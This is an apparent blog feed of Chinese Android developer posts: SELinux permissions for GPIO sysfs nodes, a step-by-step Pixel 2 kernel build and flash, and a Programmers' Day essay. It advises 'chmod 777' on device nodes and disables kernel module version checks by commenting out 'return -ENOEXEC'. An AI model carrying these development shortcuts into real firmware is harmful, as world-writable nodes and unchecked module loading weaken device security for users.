fs_type,sysfs_type;</span><br></pre></td></tr></table></figure><p>在 device/平台名/system/private/system_server.te 文件中添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow system_server wxl_abcd:file &#123; r_file_perms w_file_perms rw_file_perms &#125;;</span><br></pre></td></tr></table></figure><p>添加 write 或者 read 的权限要注意 open 的权限，最后使用 r_file_perms、w_file_perms、rw_file_perms。</p><h3 id="添加设备文件节点权限-sysfs-gpio管脚节点权限-？"><a href="#添加设备文件节点权限-sysfs-gpio管脚节点权限-？" class="headerlink" title="添加设备文件节点权限(sysfs gpio管脚节点权限)？"></a>添加设备文件节点权限(sysfs gpio管脚节点权限)？</h3><p><strong>/sys/class/leds/green/brightness</strong> //快捷方式<br><strong>/sys/devices/soc.0/gpio-leds.66/leds/green/brightness</strong> //实际节点</p><p>操作LED灯的设备文件节点为APP层system app进程开放该节点访问权限(读或写)，权限配置主要修改（一般在/device/平台/sepolicy/common）目录下的file.te、file_contexts和system_app.te三个文件<br>（1）file.te修改如下：<br>    # GPIO accessed by system app</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> sysfs_gpio, fs_type, sysfs_type;</span><br></pre></td></tr></table></figure><p>（2）file_contexts修改如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/sys/devices/soc/1010000.pinctrl/gpio/gpio62/value           u:object_r:sysfs_gpio:s0</span><br><span class="line">/sys/devices/soc/1010000.pinctrl/gpio/gpio63/value           u:object_r:sysfs_gpio:s0</span><br></pre></td></tr></table></figure><p>（3）system_app.te修改如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow system_app sysfs_gpio:file rw_file_perms;</span><br></pre></td></tr></table></figure><p>如果通过以上添加SELinux之后，仍没有权限读写sys或proc节点，需要到/system/core/rootdir/init.rc里面配置如下:<br>（1）修改设备节点用户所有者和所属用户组，以及它们所对应的权限<br>    chown system system 设备文件结点<br>    chmod 777 设备文件结点</p><h3 id="修改selinux没有生效？？？"><a href="#修改selinux没有生效？？？" class="headerlink" title="修改selinux没有生效？？？"></a>修改selinux没有生效？？？</h3><p>将SELinux Policy 文件存放在下面目录<br>（1） Google 原生目录 /system/sepolicy<br>（2） 厂商配置目录 /device/厂商平台/sepolicy/<br>android将SELinux Policy 文件存放的te一般都是在device/平台/sepolicy 和 /system/sepolicy两个目录下</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>android10.0(Q)编译安卓内核（pixel 2）</title>
      <link href="/2023/10/28/2023-10-28/"/>
      <url>/2023/10/28/2023-10-28/</url>
      
        <content type="html"><![CDATA[<h3 id="下载内核源码"><a href="#下载内核源码" class="headerlink" title="下载内核源码"></a>下载内核源码</h3><h4 id="1-查看内核版本"><a href="#1-查看内核版本" class="headerlink" title="1.查看内核版本"></a>1.查看内核版本</h4><p>首先需要看一下内核的版本，可以在手机中看到内核版本</p><p><img src="/images/20231028/20231028001.JPG"></p><h4 id="2-下载该内核版本对应的源码"><a href="#2-下载该内核版本对应的源码" class="headerlink" title="2.下载该内核版本对应的源码"></a>2.下载该内核版本对应的源码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/mount/project/androidq</span><br><span class="line">git <span class="built_in">clone</span> https://aosp.tuna.tsinghua.edu.cn/android/kernel/msm.git</span><br><span class="line"><span class="built_in">cd</span> msm</span><br><span class="line">git checkout 4fecde07e68d</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq$ git <span class="built_in">clone</span> https://aosp.tuna.tsinghua.edu.cn/android/kernel/msm.git</span><br><span class="line">正克隆到 <span class="string">&#x27;msm&#x27;</span>...</span><br><span class="line">warning: 重定向到 https://aosp.tuna.tsinghua.edu.cn/kernel/msm.git/</span><br><span class="line">remote: Enumerating objects: 2324949, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (2324949/2324949), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (521905/521905), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 11825131 (delta 1865339), reused 2217253 (delta 1796210), pack-reused 9500182</span><br><span class="line">接收对象中: 100% (11825131/11825131), 2.98 GiB | 16.48 MiB/s, 完成.</span><br><span class="line">处理 delta 中: 100% (9920545/9920545), 完成.</span><br><span class="line"></span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq$ <span class="built_in">cd</span> msm/</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq/msm$ git checkout 4fecde07e68d</span><br><span class="line">正在检出文件: 100% (56480/56480), 完成.</span><br><span class="line">注意：正在检出 <span class="string">&#x27;4fecde07e68d&#x27;</span>。</span><br><span class="line"></span><br><span class="line">您正处于分离头指针状态。您可以查看、做试验性的修改及提交，并且您可以通过另外</span><br><span class="line">的检出分支操作丢弃在这个状态下所做的任何提交。</span><br><span class="line"></span><br><span class="line">如果您想要通过创建分支来保留在此状态下所做的提交，您可以通过在检出命令添加</span><br><span class="line">参数 -b 来实现（现在或稍后）。例如：</span><br><span class="line"></span><br><span class="line">  git checkout -b &lt;新分支名&gt;</span><br><span class="line"></span><br><span class="line">HEAD 目前位于 4fecde07e68d Merge android-msm-wahoo-4.4-qt-qpr2 into android-msm-wahoo-4.4-qt-qpr3</span><br></pre></td></tr></table></figure><p>这里的分支”4fecde07e68d”就是上面的手机截图中内核版本里g后面的数字</p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><h4 id="3-安装libssl（不装编译的时候会报错）"><a href="#3-安装libssl（不装编译的时候会报错）" class="headerlink" title="3.安装libssl（不装编译的时候会报错）"></a>3.安装libssl（不装编译的时候会报错）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libssl-dev</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq/msm$ sudo apt install libssl-dev</span><br><span class="line">[sudo] longzhiye 的密码： </span><br><span class="line">正在读取软件包列表... 完成</span><br><span class="line">正在分析软件包的依赖关系树       </span><br><span class="line">正在读取状态信息... 完成       </span><br><span class="line">下列软件包是自动安装的并且现在不需要了：</span><br><span class="line">  gir1.2-goa-1.0 gir1.2-snapd-1</span><br><span class="line">使用<span class="string">&#x27;sudo apt autoremove&#x27;</span>来卸载它(它们)。</span><br><span class="line">将会同时安装下列软件：</span><br><span class="line">  libssl1.1</span><br><span class="line">建议安装：</span><br><span class="line">  libssl-doc</span><br><span class="line">下列【新】软件包将被安装：</span><br><span class="line">  libssl-dev</span><br><span class="line">下列软件包将被升级：</span><br><span class="line">  libssl1.1</span><br><span class="line">升级了 1 个软件包，新安装了 1 个软件包，要卸载 0 个软件包，有 71 个软件包未被升级。</span><br><span class="line">需要下载 2,870 kB 的归档。</span><br><span class="line">解压缩后会消耗 7,850 kB 的额外空间。</span><br><span class="line">您希望继续执行吗？ [Y/n] y</span><br><span class="line">获取:1 http://security.ubuntu.com/ubuntu bionic-security/main amd64 libssl1.1 amd64 1.1.1-1ubuntu2.1~18.04.23 [1,303 kB]</span><br><span class="line">获取:2 http://security.ubuntu.com/ubuntu bionic-security/main amd64 libssl-dev amd64 1.1.1-1ubuntu2.1~18.04.23 [1,568 kB]</span><br><span class="line">已下载 2,870 kB，耗时 5秒 (553 kB/s)    </span><br><span class="line">正在预设定软件包 ...</span><br><span class="line">(正在读取数据库 ... 系统当前共安装有 204375 个文件和目录。)</span><br><span class="line">正准备解包 .../libssl1.1_1.1.1-1ubuntu2.1~18.04.23_amd64.deb  ...</span><br><span class="line">正在将 libssl1.1:amd64 (1.1.1-1ubuntu2.1~18.04.23) 解包到 (1.1.1-1ubuntu2.1~18.04.22) 上 ...</span><br><span class="line">正在选中未选择的软件包 libssl-dev:amd64。</span><br><span class="line">正准备解包 .../libssl-dev_1.1.1-1ubuntu2.1~18.04.23_amd64.deb  ...</span><br><span class="line">正在解包 libssl-dev:amd64 (1.1.1-1ubuntu2.1~18.04.23) ...</span><br><span class="line">正在设置 libssl1.1:amd64 (1.1.1-1ubuntu2.1~18.04.23) ...</span><br><span class="line">正在设置 libssl-dev:amd64 (1.1.1-1ubuntu2.1~18.04.23) ...</span><br><span class="line">正在处理用于 libc-bin (2.27-3ubuntu1.6) 的触发器 ...</span><br></pre></td></tr></table></figure><h4 id="4-去掉内核校验（不然重刷内核后触屏没有反应）"><a href="#4-去掉内核校验（不然重刷内核后触屏没有反应）" class="headerlink" title="4.去掉内核校验（不然重刷内核后触屏没有反应）"></a>4.去掉内核校验（不然重刷内核后触屏没有反应）</h4><p><strong>$aosp\msm\arch\arm64\configs\wahoo_defconfig</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_MODVERSIONS=y</span><br><span class="line">CONFIG_MODULE_SRCVERSION_ALL=y</span><br><span class="line">修改为</span><br><span class="line"># CONFIG_MODVERSIONS=y</span><br><span class="line"># CONFIG_MODULE_SRCVERSION_ALL=y</span><br></pre></td></tr></table></figure><p><img src="/images/20231028/20231028003.JPG"></p><p><strong>$aosp\msm\kernel\module.c</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">        return -ENOEXEC;</span><br><span class="line">修改为</span><br><span class="line">        // return -ENOEXEC;</span><br></pre></td></tr></table></figure><p><img src="/images/20231028/20231028004.JPG"></p><h4 id="5-将编译工具链加入到环境变量中并编译"><a href="#5-将编译工具链加入到环境变量中并编译" class="headerlink" title="5.将编译工具链加入到环境变量中并编译"></a>5.将编译工具链加入到环境变量中并编译</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> msm</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/home/longzhiye/mount/project/androidq/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/home/longzhiye/mount/project/androidq/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/home/longzhiye/mount/project/androidq/prebuilts/misc/linux-x86/dtc</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/home/longzhiye/mount/project/androidq/prebuilts/misc/linux-x86/libufdt</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/home/longzhiye/mount/project/androidq/prebuilts/misc/linux-x86/lz4</span><br><span class="line"><span class="built_in">export</span> ARCH=arm64</span><br><span class="line"><span class="built_in">export</span> CROSS_COMPILE=/home/longzhiye/mount/project/androidq/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9/bin/aarch64-linux-android-</span><br><span class="line"><span class="built_in">export</span> CROSS_COMPILE_ARM32=/home/longzhiye/mount/project/androidq/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9/bin/arm-linux-androideabi-</span><br><span class="line"><span class="built_in">export</span> CC=/home/longzhiye/mount/project/androidq/prebuilts/clang/host/linux-x86/clang-3289846/bin/clang</span><br><span class="line">make wahoo_defconfig</span><br><span class="line">make -j4</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq$ <span class="built_in">cd</span> msm/</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq/msm$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/home/longzhiye/mount/project/androidq/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9/bin</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq/msm$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/home/longzhiye/mount/project/androidq/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9/bin</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq/msm$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/home/longzhiye/mount/project/androidq/prebuilts/misc/linux-x86/dtc</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq/msm$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/home/longzhiye/mount/project/androidq/prebuilts/misc/linux-x86/libufdt</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq/msm$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/home/longzhiye/mount/project/androidq/prebuilts/misc/linux-x86/lz4</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq/msm$ <span class="built_in">export</span> ARCH=arm64</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq/msm$ <span class="built_in">export</span> CROSS_COMPILE=/home/longzhiye/mount/project/androidq/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9/bin/aarch64-linux-android-</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq/msm$ <span class="built_in">export</span> CROSS_COMPILE_ARM32=/home/longzhiye/mount/project/androidq/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9/bin/arm-linux-androideabi-</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq/msm$ <span class="built_in">export</span> CC=/home/longzhiye/mount/project/androidq/prebuilts/clang/host/linux-x86/clang-3289846/bin/clang</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq/msm$ make wahoo_defconfig</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># configuration written to .config</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#### build completed successfully (2 seconds) ####</span></span><br><span class="line"></span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq/msm$ make -j4</span><br><span class="line">Android GCC has been deprecated <span class="keyword">in</span> favor of Clang, and will be removed from</span><br><span class="line">Android <span class="keyword">in</span> 2020-01 as per the deprecation plan <span class="keyword">in</span>:</span><br><span class="line">https://android.googlesource.com/platform/prebuilts/clang/host/linux-x86/+/master/GCC_4_9_DEPRECATION.md</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">drivers/thermal/thermal_core.c:43:26: fatal error: ../base/base.h: No such file or directory</span><br><span class="line"> <span class="comment">#include &lt;../base/base.h&gt;</span></span><br><span class="line">                          ^</span><br><span class="line">compilation terminated.</span><br><span class="line">scripts/Makefile.build:276: recipe <span class="keyword">for</span> target <span class="string">&#x27;drivers/thermal/thermal_core.o&#x27;</span> failed</span><br><span class="line">make[2]: *** [drivers/thermal/thermal_core.o] Error 1</span><br><span class="line">scripts/Makefile.build:483: recipe <span class="keyword">for</span> target <span class="string">&#x27;drivers/thermal&#x27;</span> failed</span><br><span class="line">make[1]: *** [drivers/thermal] Error 2</span><br><span class="line">make[1]: *** 正在等待未完成的任务....</span><br><span class="line">  CC      drivers/soc/qcom/wlan_firmware_service_v01.o</span><br><span class="line">Android GCC has been deprecated <span class="keyword">in</span> favor of Clang, and will be removed from</span><br><span class="line">Android <span class="keyword">in</span> 2020-01 as per the deprecation plan <span class="keyword">in</span>:</span><br><span class="line">https://android.googlesource.com/platform/prebuilts/clang/host/linux-x86/+/master/GCC_4_9_DEPRECATION.md</span><br></pre></td></tr></table></figure><p>报错信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drivers/thermal/thermal_core.c:43:26: fatal error: ../base/base.h: No such file or directory</span><br><span class="line"> <span class="comment">#include &lt;../base/base.h&gt;</span></span><br></pre></td></tr></table></figure><p>修改”drivers/thermal/thermal_core.c”文件<br><strong>$aosp\msm\drivers\thermal\thermal_core.c</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;&lt;../base/base.h&gt;&quot;</span><br><span class="line">修改为</span><br><span class="line">#include &quot;../base/base.h&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/20231028/20231028005.JPG"></p><p>继续编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j4</span><br></pre></td></tr></table></figure><p>编译成功会有如下提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  Building modules, stage 2.</span><br><span class="line">  DTC     <span class="built_in">arch</span>/arm64/boot/dts/qcom/msm8998-v2.1-soc.dtb</span><br><span class="line">  MODPOST 9 modules</span><br><span class="line">Android GCC has been deprecated <span class="keyword">in</span> favor of Clang, and will be removed from</span><br><span class="line">Android <span class="keyword">in</span> 2020-01 as per the deprecation plan <span class="keyword">in</span>:</span><br><span class="line">https://android.googlesource.com/platform/prebuilts/clang/host/linux-x86/+/master/GCC_4_9_DEPRECATION.md</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  CAT     <span class="built_in">arch</span>/arm64/boot/Image.lz4-dtb</span><br><span class="line"></span><br><span class="line"><span class="comment">#### build completed successfully (9 seconds) ####</span></span><br></pre></td></tr></table></figure><h3 id="打包并刷入手机"><a href="#打包并刷入手机" class="headerlink" title="打包并刷入手机"></a>打包并刷入手机</h3><h4 id="6-打包"><a href="#6-打包" class="headerlink" title="6.打包"></a>6.打包</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">export</span> TARGET_PREBUILT_KERNEL=/home/longzhiye/mount/project/androidq/msm/arch/arm64/boot/Image.lz4-dtb</span><br><span class="line"><span class="built_in">source</span> build/envsetup.sh</span><br><span class="line">lunch aosp_walleye-userdebug</span><br><span class="line">time make bootimage</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq/msm$ <span class="built_in">cd</span> ..</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq$ <span class="built_in">export</span> TARGET_PREBUILT_KERNEL=/home/longzhiye/mount/project/androidq/msm/arch/arm64/boot/Image.lz4-dtb</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq$ <span class="built_in">source</span> build/envsetup.sh</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidq$ lunch aosp_walleye-userdebug</span><br><span class="line"></span><br><span class="line">============================================</span><br><span class="line">PLATFORM_VERSION_CODENAME=REL</span><br><span class="line">PLATFORM_VERSION=10</span><br><span class="line">TARGET_PRODUCT=aosp_walleye</span><br><span class="line">TARGET_BUILD_VARIANT=userdebug</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">OUT_DIR=out</span><br><span class="line">PRODUCT_SOONG_NAMESPACES=device/google/wahoo vendor/google/camera hardware/google/pixel</span><br><span class="line">============================================</span><br><span class="line">20:31:39 Disallowed PATH tool <span class="string">&quot;locale&quot;</span> used: []string&#123;<span class="string">&quot;locale&quot;</span>, <span class="string">&quot;-a&quot;</span>&#125;</span><br><span class="line">20:31:39 See https://android.googlesource.com/platform/build/+/master/Changes.md<span class="comment">#PATH_Tools for more information.</span></span><br><span class="line">20:31:43 Disallowed PATH tool <span class="string">&quot;locale&quot;</span> used: []string&#123;<span class="string">&quot;locale&quot;</span>, <span class="string">&quot;-a&quot;</span>&#125;</span><br><span class="line">20:31:43 See https://android.googlesource.com/platform/build/+/master/Changes.md<span class="comment">#PATH_Tools for more information.</span></span><br><span class="line">[100% 2/2] Target boot image from recovery: out/target/product/walleye/boot.img</span><br><span class="line"></span><br><span class="line"><span class="comment">#### build completed successfully (18 seconds) ####</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">real    0m18.171s</span><br><span class="line">user    0m21.882s</span><br><span class="line">sys     0m7.009s</span><br></pre></td></tr></table></figure><h4 id="7-刷入手机"><a href="#7-刷入手机" class="headerlink" title="7.刷入手机"></a>7.刷入手机</h4><p>手机进入fastboot模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd ~/mount/project/androidq</span><br><span class="line">source build/envsetup.sh</span><br><span class="line">lunch aosp_walleye-userdebug</span><br><span class="line">adb reboot bootloader</span><br><span class="line">cd out/target/product/walleye/</span><br><span class="line">fastboot flash boot boot.img</span><br><span class="line">fastboot reboot</span><br></pre></td></tr></table></figure><p>成功刷入手机，开机后进入查看内核界面，”Kernel verion”已经发生变化</p><p><img src="/images/20231028/20231028002.JPG"></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你知道吗？“1024”是个节！</title>
      <link href="/2023/10/24/2023-10-24/"/>
      <url>/2023/10/24/2023-10-24/</url>
      
        <content type="html"><![CDATA[<p>随着科技的飞速发展，程序员这个群体逐渐成为了社会中不可或缺的一部分。他们用智慧和汗水，为世界带来更多的便捷与创新。今天，我们迎来<strong>1024程序员节</strong>，这是为了向全球的程序员们表达敬意和感激的节日。让我们一起走进程序员的内心世界，了解他们的职业与生活，感受他们的激情与智慧。</p><p><img src="/images/20231024/20231024001.png"></p><h3 id="程序员的崛起：科技创新的驱动力"><a href="#程序员的崛起：科技创新的驱动力" class="headerlink" title="程序员的崛起：科技创新的驱动力"></a>程序员的崛起：科技创新的驱动力</h3><p>程序员，一个充满智慧与创造力的职业。他们通过编写代码，赋予了机器生命和智慧。随着互联网、人工智能、大数据等领域的飞速发展，程序员的地位变得越来越重要。他们不仅在科技创新中发挥着关键作用，还推动了社会生产方式的变革。</p><p><img src="/images/20231024/20231024002.jpeg"></p><h3 id="程序员的生活：枯燥与乐趣的交织"><a href="#程序员的生活：枯燥与乐趣的交织" class="headerlink" title="程序员的生活：枯燥与乐趣的交织"></a>程序员的生活：枯燥与乐趣的交织</h3><p>在许多人眼中，程序员的生活是枯燥无味的。他们整日面对着屏幕，敲打键盘，但正是这些日复一日的工作，为我们的生活带来了无数的便捷与乐趣。然而，程序员们也有自己的乐趣。他们在代码的世界里寻找着挑战与刺激，通过编程展现着自己的创意与才华。</p><p><img src="/images/20231024/20231024003.png"></p><h3 id="程序员的魅力：解决问题与创造价值的双重使命"><a href="#程序员的魅力：解决问题与创造价值的双重使命" class="headerlink" title="程序员的魅力：解决问题与创造价值的双重使命"></a>程序员的魅力：解决问题与创造价值的双重使命</h3><p>程序员最大的魅力在于其解决问题的能力。他们通过分析问题、设计算法、编写代码，最终解决问题。此外，他们还通过技术创新，为各行各业创造价值。无论是医疗、教育、金融还是工业制造，程序员都在为其带来前所未有的变革。</p><p><img src="/images/20231024/20231024004.png"></p><h3 id="1024程序员节：致敬与鼓励"><a href="#1024程序员节：致敬与鼓励" class="headerlink" title="1024程序员节：致敬与鼓励"></a>1024程序员节：致敬与鼓励</h3><p>在即将到来的<strong>1024程序员节</strong>的特殊日子里，我们要向全球的程序员们表达最深的敬意和感谢。他们的努力与付出，为我们创造了美好的今天。同时，我们也要鼓励更多的年轻人投身程序员行列，为科技创新事业注入新的活力。</p><p>程序员是当今科技创新时代的重要支柱。他们用代码为世界插上翅膀，用智慧开启无限可能。在即将到来的<strong>1024程序员节</strong>的特殊节日里，让我们一起致敬这些无畏的探索者致敬他们的专注与热情致敬他们的创新与担当向他们致以崇高的敬意。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>底层全部重构，小米澎湃OS完整系统架构公布</title>
      <link href="/2023/10/23/2023-10-23/"/>
      <url>/2023/10/23/2023-10-23/</url>
      
